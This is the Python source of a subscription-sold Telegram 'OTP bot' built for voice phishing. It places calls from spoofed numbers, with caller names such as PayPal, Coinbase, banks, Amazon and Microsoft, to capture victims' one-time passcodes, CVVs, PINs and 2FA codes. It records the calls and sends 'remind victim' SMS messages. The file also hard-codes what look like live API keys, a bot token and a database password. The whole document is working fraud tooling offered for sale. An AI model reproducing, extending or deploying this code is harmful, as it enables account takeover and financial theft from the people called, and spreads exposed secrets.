import numbers
import vonage
import os
from unicodedata import name
from telegram.ext import *
import re
import string
import random
from pymongo import MongoClient


from telegram import *



import requests
import datetime
import requests
import json
import telnyx
import logging
logging.basicConfig()
logging.getLogger('telnyx').setLevel(logging.DEBUG)

token = "6802057382:AAFpR8aHxKnhlsLlSzQHYLcYcOK3VTCMTdY"
telnyx.api_key = "zSodtu6MSjirqiC-rcojrw"

telnyx_connection_id = "2313004129879852396"

url = "https://7bdf-2607-fb91-bdbd-cc7a-501-8186-ad0e-2dba.ngrok.io"


admins = [1707902557,6170027081]


jsonbin_apikey = "$2b$10$yMBgc3lQAJfWiWRZve1SmeSqGc2o/4CiNWBct5ozpOfBN6V4xrNtO"



FIRST_INP, SECOND_INP, THIRD_INP = range(3)


debug = True

client = MongoClient("mongodb+srv://stonedape:almanac1@cluster1.v2k60.mongodb.net/?retryWrites=true&w=majority")
db = client["otp_bot"]
keys = db["keys"]
users = db["users"]


def checkdate(chatid):
    cursor = users.find({'chat_id': int(chatid)})
    if cursor is not None:
        for doc in cursor:
            expirationdate = doc['expiration_date']
            if expirationdate == "Never":
                return True
            else:
                expiration_date = datetime.datetime.strptime(expirationdate, "%Y/%m/%d %H:%M:%S")
                if datetime.datetime.now() > expiration_date:

                    return False
                else:

                    return True
    else:
        return False
    


def genkey(update, context):
    if update.message.chat_id in admins:
        duration = str(context.args[0]) if context.args else None

        if not duration:
            # Handle the case when context.args is empty
            print("Error: No duration provided.")
            return

        num_keys = int(context.args[1]) if len(context.args) > 1 else 1

        prefix = "ApeOTP"
        keys_generated = []

        for i in range(num_keys):
            code = ["".join(random.choices(string.ascii_uppercase + string.digits, k=5)) for i in range(4)]
            key = f"{prefix}-{code[0]}-{code[1]}-{code[2]}-{code[3]}"

            key_exists = db.keys.find_one({"key": key})

            while key_exists:
                code = ["".join(random.choices(string.ascii_uppercase + string.digits, k=5)) for i in range(4)]
                key = f"{prefix}-{code[0]}-{code[1]}-{code[2]}-{code[3]}"
                key_exists = db.keys.find_one({"key": key})

            keys.insert_one({
                "key": key,
                "Duration": duration,
                "By": update.message.chat.username,
                "used": False
            })

            keys_generated.append(key)

        keys_str = "\n".join(keys_generated)
        context.bot.send_message(chat_id=update.effective_chat.id, text=keys_str)
        print(f"{datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S')} | {update.message.chat.username} Generated {num_keys} key(s):\n{keys_str} for {duration} with id {update.message.chat_id}")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text="You are not allowed to use this command")
        print(f"{datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S')} | {update.message.chat.username} Tried to use the genkey command with id {update.message.chat_id}")


def redeem(update, context):
    key = context.args[0]
    db_key = keys.find_one({"key": key})
    if db_key is not None and not db_key["used"]:
        # Update the key to mark it as used
        keys.update_one({"key": key}, {"$set": {"used": True}})
        duration = db_key["Duration"]

        exp_date = None  # Initialize exp_date

        if "Hour" in duration:
            newduration = duration.replace("Hour", "")
            exp_date = datetime.datetime.now() + datetime.timedelta(hours=int(newduration))
        elif "Day" in duration:
            newduration = duration.replace("Day", "")
            exp_date = datetime.datetime.now() + datetime.timedelta(days=int(newduration))
        elif "Week" in duration:
            newduration = duration.replace("Week", "")
            exp_date = datetime.datetime.now() + datetime.timedelta(weeks=int(newduration))
        elif "Month" in duration:
            newduration = duration.replace("Month", "")
            exp_date = datetime.datetime.now() + datetime.timedelta(days=int(newduration) * 30)
        elif "Year" in duration:
            newduration = duration.replace("Year", "")
            exp_date = datetime.datetime.now() + datetime.timedelta(days=int(newduration) * 365)
        elif duration == "Lifetime":
            exp_date = "Never"

        exp_date_str = exp_date.strftime('%Y/%m/%d %H:%M:%S') if exp_date else None

        users.insert_one({
            "username": update.message.chat.username,
            "chat_id": update.effective_chat.id,
            "expiration_date": exp_date_str,
            "key": key,
            "Decision": None
        })


def plan(update, context):
    chat_id = update.effective_chat.id
    db_user = db.users.find_one({"chat_id": chat_id})
    if db_user is not None:
        expiration_date = db_user["expiration_date"]
        if expiration_date == "Never":
            context.bot.send_message(chat_id=update.effective_chat.id, text=f"You have a Lifetime Subscription")
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text=f"Your Subscription will expire at {expiration_date}")
    else:
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"You don't have a subscription")


#main
def start(update: Update, context: CallbackContext):
          print(update.message.chat_id)
          purchase = InlineKeyboardButton("purchase", url="t.me/RealStonedApe")
          Channel = InlineKeyboardButton("Channel", url="t.me/+D0XFbS0I0vkyYTJh")
          inline_keyboard = [[purchase, Channel]]
          update.message.reply_text(f"""
🚀 Welcome to Apes Otp Bot  🚀

🔐 ➜ /redeem | Redeem your subscription
⏱ ➜ /plan | Check your subscription

📝  Custom Commands  📝
🧾 ➜ /createscript | Create custom scripts
🔏 ➜ /script [scriptid] | View script
🗣 ➜ /customcall | Call with script

📝 Calling Modules
📞 ➜ /call | Capture PayPal, CoinBase...
🏦 ➜ /bank | Capture OTP Bank
💳 ➜ /cvv | Capture CVV
🔢 ➜ /pin | Capture PIN
🍏 ➜ /applepay | Capture OTP Credit Card
🔵 ➜ /coinbase | Capture 2FA Code
💸 ➜ /crypto | Capture Crypto Code 
📦 ➜ /amazon | Approval Authentication
💻 ➜ /microsoft | Capture Microsoft Code
🅿️ ➜ /paypal | Capture Paypal Code
🏦 ➜ /venmo | Capture Venmo Code
💵 ➜ /cashapp | Capture Cashapp Code
💳 ➜ /quadpay | Capture quadpay Code
📟 ➜ /carrier | Capture carrier Code
📧 ➜ /email | grab Email code
🕖 ➜ /remind | remind victim

SET CUSTOM VOICE
🗣 ➜ /customvoice | Modify the TTS
❗️ ➜ EXAMPLE: /customvoice number spoof service name sid language

🔰  Purchase Apes OTP BOT  🔰
💎 Extras
◆ ⌨️ ⮞ /recall for re calling 
◆ ❓ ⮞ Do '?' on from number for instant random spoof number""",parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(inline_keyboard))



def button(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    
    if query.data == "accept":
        chatid = query.message.chat_id
        result = users.update_one(
            {'chat_id': int(chatid)},
            {'$set': {'Decision': 'accept'}}
        )
        query.edit_message_text(text=query.message.text + "\n🔑 Code has Been accepted", parse_mode=ParseMode.HTML)


    elif query.data == "deny":
        chatid = query.message.chat_id
        result = users.update_one(
            {'chat_id': int(chatid)},
            {'$set': {'Decision': 'deny'}}
        )
        query.edit_message_text(text=query.message.text + "\n⚒️ Code has been rejected", parse_mode=ParseMode.HTML)


def carrier(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "carrier"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /carrier 15087144578 18888888888 John" + '\n' + "📲 /carrier number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def cashapp(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "cashapp"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /cashapp 15087144578 18888888888 John" + '\n' + "📲 /cashapp number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)


def call(update: Update, context: CallbackContext):
    # get telegram username
    try:
        username = update.message.from_user.username
    except:
        username = "Unknown"
        
    print(username + " is trying to call")

    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return

    try:
        if checkdate(update.effective_chat.id):
        #if 1==1 :
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            otpdigits = msg[5]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']

            call_info = {
                'number': number,
                'spoof': spoof,
                'service': service,
                'name': name,
                'otpdigits': otpdigits,
                'tag': tag,
                'chatid': chatid
            }
            context.user_data['call_info'] = call_info

            print(username + " CALLING NOW")
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/{otpdigits}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            #call = call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", record="record-from-answer", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/{otpdigits}/{chatid}/{tag}", answering_machine_detection= "premium")
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
            
        else:
            update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)     

    except Exception as err:
        update.message.reply_text("⚠ Error: " + str(err) + '\n' + '\n' + "❌ Oops... Something went wrong." + '\n' + "📞 /call 15087144578 18888888888 Paypal John 6" + '\n' + "☎️ /call number spoofnumber service name otpdigits")

def paypal(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "paypal"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /paypal 15087144578 18888888888 John" + '\n' + "📲 /paypal number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)


def venmo(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "venmo"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /venmo 15087144578 18888888888 John" + '\n' + "📲 /venmo number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)


def recall(update: Update, context: CallbackContext):
    if checkdate(update.effective_chat.id):
        call_info = context.user_data.get('call_info')
        if call_info:
            number = call_info['number']
            spoof = call_info['spoof']
            service = call_info['service']
            name = call_info['name']
            otpdigits = call_info['otpdigits']
            tag = call_info['tag']
            chatid = call_info['chatid']

            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/{otpdigits}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""" , reply_markup=reply_markup)
        
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)



def end_call(update: Update, context: CallbackContext):
    print("endcall")
    query = update.callback_query
    if query.data == 'end_call':
        call = context.user_data['call']
        call.hangup()



def crypto(update: Update, context: CallbackContext):
    #print(update.message['text'])
    msg = str(update.message['text']).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            otpdigits = msg[6]
            last4digits = msg[5]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", record="record-from-answer", webhook_url=f"{url}/crypto/{number}/{spoof}/{service}/{name}/{last4digits}/{otpdigits}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except Exception as err:
            print(err)
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "💳 /crypto 15087144578 18888888888 Visa John 1422 6" + '\n' + "📲 /crypto number spoofnumber service name last4digits otpdigits") 

    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)  



def quadpay(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "quadpay"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /quadpay 15087144578 18888888888 John" + '\n' + "📲 /quadpay number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)


def help(update: Update, context: CallbackContext):
          print(update.message.chat_id)
          purchase = InlineKeyboardButton("purchase", url="t.me/RealStonedApe")
          Channel = InlineKeyboardButton("Channel", url="t.me/+D0XFbS0I0vkyYTJh")
          inline_keyboard = [[purchase, Channel]]
          update.message.reply_text(f"""
🚀 Welcome to Apes Otp Bot  🚀

🔐 ➜ /redeem | Redeem your subscription
⏱ ➜ /plan | Check your subscription

📝  Custom Commands  📝
🧾 ➜ /createscript | Create custom scripts
🔏 ➜ /script [scriptid] | View script
🗣 ➜ /customcall | Call with script

📝 Calling Modules
📞 ➜ /call | Capture PayPal, CoinBase...
🏦 ➜ /bank | Capture OTP Bank
💳 ➜ /cvv | Capture CVV
🔢 ➜ /pin | Capture PIN
🍏 ➜ /applepay | Capture OTP Credit Card
🔵 ➜ /coinbase | Capture 2FA Code
💸 ➜ /crypto | Capture Crypto Code 
📦 ➜ /amazon | Approval Authentication
💻 ➜ /microsoft | Capture Microsoft Code
🅿️ ➜ /paypal | Capture Paypal Code
🏦 ➜ /venmo | Capture Venmo Code
💵 ➜ /cashapp | Capture Cashapp Code
💳 ➜ /quadpay | Capture quadpay Code
📟 ➜ /carrier | Capture carrier Code
📧 ➜ /email | grab Email code
🕖 ➜ /remind | remind victim

SET CUSTOM VOICE
🗣 ➜ /customvoice | Modify the TTS
❗️ ➜ EXAMPLE: /customvoice number spoof service name sid language

🔰  Purchase Apes OTP BOT  🔰
💎 Extras
◆ ⌨️ ⮞ /recall for re calling 
◆ ❓ ⮞ Do '?' on from number for instant random spoof number""",parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(inline_keyboard))


def pin(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return

    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            otpdigits = msg[5]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/pin/{number}/{spoof}/{service}/{name}/{otpdigits}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /pin 15087144578 18888888888 Paypal John 6" + '\n' + "📲 /pin number spoofnumber service name otpdigits")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def email(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/email/{number}/{spoof}/{service}/{name}/3/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /email 15087144578 18888888888 Yahoo John" + '\n' + "📲 /call number spoofnumber service name")

    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def amazon(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "Amazon"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /amazon 15087144578 18888888888 John" + '\n' + "📲 /amazon number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)
# def etoro(update: Update, context: CallbackContext):


def microsoft(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "microsoft"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /microsoft 15087144578 18888888888 John" + '\n' + "📲 /microsoft number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)


def coinbase(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "coinbase"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /coinbase 15087144578 18888888888 John" + '\n' + "📲 /coinbase number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def applepay(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = "Applepay"
            name = msg[3]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", webhook_url=f"{url}/voice/{number}/{spoof}/{service}/{name}/6/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /applepay 15087144578 18888888888 John" + '\n' + "📲 /applepay number spoofnumber name")
   
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def bank(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            bank = msg[3]
            name = msg[4]
            otpdigits = msg[5]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{bank}", record="record-from-answer", webhook_url=f"{url}/bank/{number}/{spoof}/{bank}/{name}/{otpdigits}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "🏦 /bank 15087144578 18888888888 Chase John 6" + '\n' + "📲 /bank number spoofnumber bank name otpdigits") 

    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def cvv(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            bank = msg[3]
            name = msg[4]
            cvvdigits = msg[5]
            last4digits = msg[6]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{bank}", record="record-from-answer", webhook_url=f"{url}/cvv/{number}/{spoof}/{bank}/{name}/{cvvdigits}/{last4digits}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "💳 /cvv 15087144578 18888888888 Visa John 3 1422" + '\n' + "📲 /cvv number spoofnumber bank name cvvdigits last4digits") 
     
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)  


# make a command to create a custom script, using a conservation with 4 questions/answers
def createcustom(update: Update, context: CallbackContext):
    # prompt user for 4 questions
    context.bot.send_message(chat_id=update.effective_chat.id, text="test")
    # parse the first question
    first = update.message.text
    print(first)



def balance(update: Update, context: CallbackContext):
    if update.effective_user.id in admins:
        tbalance = telnyx.Balance.retrieve()    
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"🔒 Balance: {tbalance}", parse_mode=ParseMode.HTML)





def remind(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            service = msg[2]
            name = msg[3]
            tag = update.message.chat.username
            your_telnyx_number = "+19808888120"
            update.message.reply_text(f"📞 Reminder sent to {number} from {service} \n\n {service}: Hello {name}, We have tried reaching out to you. We will call you back as soon as possible. We appreciate your patience as we continue to solve this issue.")
            reminder = f"{service}: Hello {name}, We have tried reaching out to you. We will call you back as soon as possible. We appreciate your patience as we continue to solve this issue."
            client = vonage.Client(key="6781dcc9", secret="969zhY1SgrOOpi0h")
            responseData = client.sms.send_message(
            {
                "from": your_telnyx_number,
                "to": number,
                "text": reminder
            }
                        )
        except Exception as ex:
            print(ex)
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "✉ /remind 15087144578 PayPal John" + '\n' + "📲 /remind number service name")
     
    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)


def set_input_handler(update: Update, context: CallbackContext):
    context.bot.send_message(chat_id=update.effective_chat.id,
                                 text="Please enter the first part of the script \nVARIABLES: {name} {module} {otpdigits}", parse_mode=ParseMode.HTML)
    return FIRST_INP

